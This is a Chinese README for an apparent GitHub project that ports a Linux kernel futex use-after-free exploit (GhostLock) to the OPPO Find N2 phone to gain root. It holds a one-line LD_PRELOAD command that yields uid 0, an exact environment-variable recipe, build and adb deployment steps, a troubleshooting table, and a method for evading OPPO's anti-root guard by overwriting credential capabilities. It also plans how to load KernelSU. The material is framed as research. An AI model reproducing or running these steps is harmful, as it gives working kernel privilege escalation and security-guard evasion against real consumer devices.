# oppo-ghostlock

> 状态（2026-10-05 冻结）：零环境变量单条命令已拿到真 root（uid=0，已多次复现）；设备健康为抽签 —— 约一半运行在写入落地后 framework 会塌，未命中的发也可能致死；KernelSU 未 Live，路线已探明，剩余为一次抽奖。权威冻结记录见 [`_docs/handoff/preload一键提权-mt99K-20261005-1600.md`](_docs/handoff/preload一键提权-mt99K-20261005-1600.md)。

GhostLock CVE-2026-43499 — OPPO Find N2 Linux 内核提权研究

[![Version](https://img.shields.io/badge/version-2.0--root%20achieved-success)](https://github.com/pubglite55/oppo-ghostlock)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Build](https://img.shields.io/badge/build-NDK%20r29-orange)]()

## 项目概述

GhostLock (CVE-2026-43499) 是一个影响 Linux 2.6.39 至 7.1-rc1 的内核栈 UAF 漏洞，通过 `FUTEX_CMP_REQUEUE_PI` 竞态条件触发。本项目将其适配到 **OPPO Find N2 (SM8475 / PGU110, ARM64, kernel 5.10.236)**。

## ★ 当前状态:已拿到真 root(N2/P2/K3 3/3 复现,当轮设备未崩;mt99K 另复现 6 次,含零环境变量单条命令)。**注意:设备健康本身是抽签** —— 约一半运行在写入落地后 framework 会塌(`zyg 5→0`、`unknown SID` 失控),未命中的发也可能致死(prep 机器本身 543 fork + 64GB mmap)

```
[+] mt47: ROOT-SEEN … CapEff=ffffff8a368280c0 poll=17     <- caps 写入落地
[*] mt47: after setres uid=0 euid=0 gid=0 egid=0          <- ★ 真 uid=0 ★
[+] mt47: ksud loader launched (uid=0) pid=20644
设备: enforce=Permissive  uptime 连续  framework OK       <- 无崩溃
```

三轮独立运行(N2 / P2 / K3)全部命中,证据见 `docs/evidence-root-*.log`。

### ★ 零环境变量单条命令(2026-10-05,mt99P「worker + park」)

```bash
adb shell "LD_PRELOAD=/data/local/tmp/preloadP.so /system/bin/toybox id"
# uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),… context=u:r:shell:s0
```

产物 `preload.so` sha256 `b5128c725216aad1464bc5c54e39bb2d980c2b3a474adc17278a4f9100acdb54`(214,040 B,设备端 `/data/local/tmp/preloadP.so` 已核对一致);提权体现在**调用者自己的进程**里(root 子进程读 `/proc/self/cmdline` + `/proc/self/exe` 后 `execve` 原始命令行)。

一次调用内完成 **stage 1(SELinux enforcing→0)** 与 **stage 2(caps 提权 + 交还原始命令行)**,不依赖任何环境变量。
实测设备状态:同一 boot **`uptime` 连续**、`enforce=Permissive`、**`unknown SID=0`**、`workqueue lockup` 不累积、
`oops=0`、framework 正常(`zygote+system_server` 在)。

#### 为什么必须 worker + park(本轮 5 次对照实测)

| 证据 | 结论 |
|---|---|
| run B / run D:**fired write 之后对同一个 task 做 execve** | 999~1072 条 `unknown SID` + 同进程每秒重试 binder(-22) → **exec 可执行文件返回 ENOENT**、PowerManager 消失 → framework 塌 → 黑屏/看门狗复位 |
| stage1-only(write 落地、**无 execve**)跑 6.5 分钟 | `uSID=0 / wq=0 / framework 在` —— 单打 SELinux 无害 |
| stage2-only(trigger 0 发)跑 6.5 分钟 | 同样无害 |
| run C(stage1 跳过 → stage2 fired) | 无害 |
| 「execve 立刻拆 mm 就 panic」 | **证伪**:两次 execve 都成功、stage 2 之后正常跑满 60s;真凶是**延迟的内核状态破坏** |

因此:**每个 arb write 都在独立 worker 子进程里发生,写完 `pause()` 永久 park**(绝不 `_exit`、绝不 `execve`);
**调用者进程永不成为写入者**(它的 exit 因此安全);root 仍由 stage-2 worker 里**在 trigger 之前** fork 出来的
`cred_child` 持有并 exec 原始命令行。

另外三条本轮换来的硬教训:

1. **完成信号不能用文件**:提权后 payload 的 fs view 已损坏(`open(O_CREAT)` 失败),`root_alive.txt` 永不出现
   → worker 误判「no root」→ `exit(-1)` 变 zombie、coordinator 空转 5 分钟。改用**继承的 pipe fd**
   (`select` peek 不消费),root 落地瞬间通知。
2. **只回收「未打中」的 worker**:未打中 ⇒ `enforce` 仍为 1 ⇒ 没写过 ⇒ 未中毒 ⇒ 可安全 SIGKILL。
   否则一个 park 住的 worker 带着 ~950 个 parked 子进程 + 64GB 映射,第二次重试叠上去直接打复位设备。
3. **设备侧 fsync 不可信**:`/data` 挂载参数 **`fsync_mode=nobarrier`**,崩溃/复位后取证文件必变
   `-?????????`(损坏 inode,`stat/rm/push` 全 EACCES,永久钉死)。取证必须走
   **trace 直写调用者 stdout(adb socket)+ host 侧 `tee`**。

> KernelSU **未 Live**,但路线已探明(详见下 §未完成 与 [`_docs/handoff/preload一键提权-mt99K-20261005-1600.md`](_docs/handoff/preload一键提权-mt99K-20261005-1600.md)):
> 顺序已改为 **root → KernelSU → hand-off**(`mt96 ksud` / `mt97 finit_module` 的调用点已从 hand-off 之后移到之前 —— hand-off 的 `execve` 永不返回,之前的 KSU 代码是死代码);
> 唯一可行路线 `finit_module(ko_fd,"",3)`,唯一门槛 `CAP_SYS_MODULE(bit16)` **无法确定性置位**(被写入的值必须同时是已映射内核 VA 供 `rb_erase` 解引用,且它本身就是 caps 的位图)⇒ 剩余是一次抽签。

### 关键机制:用 caps 写入绕开厂商反 root 守护

OPPO 的 `oplus_security_guard.ko` 只比较 `uid/euid/gid/egid` 的**下降沿**,**不读 capabilities**;
而 `setresuid`(syscall 146)在其**豁免表**内。因此:

1. 只写 `cred->cap_effective`(偏移 `0x38`),**绝不触碰 uid/euid/gid/egid** ⇒ 守护看不见;
2. 拿到 `CAP_SETUID|CAP_SETGID` 后走 `setresuid(0,0,0)` ⇒ uid 下降沿落在豁免区 ⇒ 不上报。

### 可复现配方(六开关,缺一必败)

```bash
export PSELECT_SKIP_WARMUP=1 PSELECT_SLIDE_TRIGGER=1
export PSELECT_CRED=1            # 进入凭证链
export PSELECT_PERF_CRED=1       # ★ 决定性开关:让 perf 泄露提取 cred_addr
export PSELECT_CAPS_MODE=1       # 写 cap_effective(而非 uid)
export PSELECT_RETRY=1           # 禁止 8 轮连打(连打 = 悬垂毒叠加 = 黑屏)
export PSELECT_WINDOW_SECONDS=60 # 窗口不足会 mid-burst 中止
export PSELECT_TREE_PC=ffffff802aa793c0 PSELECT_TREE_RIGHT=SPRAY PSELECT_TRIGGER_SHOTS=16
export LD_PRELOAD=/data/local/tmp/preload29.so
cd /data/local/tmp && timeout 420 /system/bin/ls /dev/null
```

**★ 交付时不要传 `PSELECT_ROOT_EXIT`** —— 持毒进程应 park 而非 `_exit`(`_exit` 触发 mm teardown 会
panic,这是本机早期反复黑屏的根因)。

**两条前置条件**:① SELinux **Permissive**(E5 命中,否则 `perf_event_open` 返回 EACCES);
② **MemFree ≥ 2GB**(543 子进程喷砂需要匿名内存;开机头 1~2 分钟 force-stop + kill-all 最有效)。

### 失败症状快查

| 日志 | 病因 | 修法 |
|---|---|---|
| `mt40: no cred_cand from perf - need PSELECT_PERF_CRED` | 缺开关 | 加 `PSELECT_PERF_CRED=1` |
| `perf_event_open failed errno=13` | 仍 Enforcing | 先打 E5 |
| `mt47: alive poll=…` 一直涨、`CapEff=0` | `cred_addr=0` 或写入未落地 | 查上面两条 |
| `mt28m: cred write attempt 1/8` | 没传 `PSELECT_RETRY=1` | 传 1 |
| `CANNOT LINK EXECUTABLE … not found` | 重启后 `/data/local/tmp` 被清 | 重推 + 校验 sha |
| `window closed mid-burst` | 窗口太短 | 60s |

## 未完成:KernelSU Live / 持久化

Root 是**瞬时的**(持毒 worker park,不对外提供 su;软重启即失)。KernelSU **未 Live**,但路线已探明 —— 三条路线全部实测判定
(权威冻结记录:[`_docs/handoff/preload一键提权-mt99K-20261005-1600.md`](_docs/handoff/preload一键提权-mt99K-20261005-1600.md)):

1. **`ksud late-load`:模块不在 ksud 里。** 设备上的 ksud = 官方 v3.3.0 standalone(6,286,568 B,与 release 资产同尺寸),
   它从**已安装的 manager APK** 取内嵌模块;本机没装 `me.weishu.kernelsu` ⇒ 打印什么都没有、`rc=0`(不是被拦、不是崩溃)。
2. **`ksud insmod /proc/self/fd/<ko_fd>`:模块读到了,但死在 kallsyms。** fd 路径有效(报错信息里打印出真实路径
   `/data/local/tmp/KernelSU.ko`),失败于 `Cannot parse kallsyms / Operation not permitted (os error 1)`——
   `/proc/kallsyms` 需要 `CAP_SYSLOG(bit34)`,本发 caps 没有。
3. **`finit_module(ko_fd, "", 3)`:唯一可行路线。** flags 3 = IGNORE_MODVERSIONS|IGNORE_VERMAGIC,不需要 kallsyms、
   不需要 manager APK,唯一门槛是 `CAP_SYS_MODULE(bit16)`。设备 KO 是官方 `lkm-aarch64-android12-5.10_kernelsu.ko`
   (349,936 B,与 release 同尺寸)=**与本机内核同 KMI**,因此跳过 vermagic 是 ABI 安全的(不是猜的)。

顺序已改为 **root → KernelSU → hand-off**(`main.c` 侧 ksud 用预开 fd + `execveat(fd,"",…,AT_EMPTY_PATH)` 拉起;`mt96 ksud` /
`mt97 finit_module` 调用点已移到 hand-off **之前**)。**bit16 不能确定性置位**(实测 4 发 bit16=0、累计 1/5)⇒ 剩余是一次抽签。
`exploit-v29/tools/ksu_go.sh` 已备好(复原自上游成功流程)。

早期记录(保留):OPPO 守护对 KernelSU 管理器有拦截 —— dmesg 实证 `libksud.so result execve_block`、`curr_name@@kernelsu_zygote`。

## 技术栈

- Android 16 / Linux 5.10.236-android12-9-o-g74d132f4467a / OPPO Find N2 (SM8475)
- GhostLock (CVE-2026-43499) rtmutex stack UAF + `FUTEX_CMP_REQUEUE_PI`
- KernelSnitch mm_struct 泄漏 + perf_event_open 凭证泄露
- Android NDK r29 (`aarch64-linux-android35-clang`)

## 快速开始

```bash
# 1) 编译
cd exploit-v29 && bash ../build_v29.sh         # 产物: build/oppo-find_n2/bin/preload.so

# 2) 部署(每次设备重启后都要重推,/data/local/tmp 会被清)
adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/preload29.so
adb shell chmod 755 /data/local/tmp/preload29.so
adb shell sha256sum /data/local/tmp/preload29.so   # 与本机 sha 核对

# 3) 腾内存(抢在应用自启前)
for p in com.tencent.mm com.eg.android.AlipayGphone com.ss.android.ugc.aweme com.phoenix.read; do
  adb shell am force-stop $p; done
adb shell am kill-all
adb shell grep MemFree /proc/meminfo         # 目标 >= 2GB

# 4) 打(配方见上;先 E5 拿 Permissive,再 caps 链拿 root)
```

## 目录结构

```
oppo-ghostlock/
├── exploit-v29/                      # 核心 exploit(matisse 移植,GPL-3.0 见 NOTICE.md)
│   ├── src/ main.c slide.c util.c …  # mt90 caps 分支 / mt92 root exit / 路线实现
│   ├── src/targets/oppo-find_n2/     # 本机偏移定义
│   └── tools/ksu_go.sh               # KernelSU 装载脚本
├── docs/ matisse-port.md             # §0–§13.5 完整技术记录
├── docs/evidence-root-*.log          # ★ 三次成功 root 的原始日志
├── docs/reference-matisse-win-*.md   # 上游同源项目成功记录
└── README.md
```

## 致谢

- [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) — GhostLock exploit 原始实现
- [NebuSec IonStack Writeup](https://nebusec.ai/research/ionstack-part-2/) — 技术分析
- [Dere3046/ElevateMe](https://github.com/Dere3046/ElevateMe) — rb_erase cred 覆写机制
- [diyiqiuye/CVE-2025-21479-FX5P](https://github.com/diyiqiuye/CVE-2025-21479-FX5P) — 偏移工具与 profile 方法论
- [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) — cph2521(同 SoC)偏移交叉验证

## 开源协议

MIT(子目录 `exploit-v29/` 源自 GPL-3.0 的 matisse,该子树维持 GPL-3.0,见 `NOTICE.md`)